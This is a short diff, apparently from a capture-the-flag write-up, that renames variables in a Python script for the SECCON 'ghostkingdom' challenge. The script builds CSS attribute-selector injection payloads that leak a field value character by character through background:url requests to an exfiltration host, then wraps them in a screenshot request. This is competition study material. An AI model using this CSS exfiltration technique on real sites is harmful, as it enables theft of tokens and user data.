@@ -113,9 +113,9 @@ for c in chars:
   value = inicio + c
   payload += '%s[value^="%s"]{background:url("%s/%s");}\n' % (element, value, exfilturl, value+'_')
 
-url = 'http://l.mydomain.com/?css=' + urlencode(b64encode(payload)) + '%2&msg=test&action=msgadm2'
-url2 = 'http://ghostkingdom.pwn.seccon.jp/?url=' + urlencode(url) + '&action=sshot2'
-print(url2)
+send_msg_url = 'http://l.mydomain.com/?css=' + urlencode(b64encode(payload)) + '%2&msg=test&action=msgadm2'
+screenshot_exfil_url = 'http://ghostkingdom.pwn.seccon.jp/?url=' + urlencode(send_msg_url) + '&action=sshot2'
+print(screenshot_exfil_url)
 ```
 
 ```
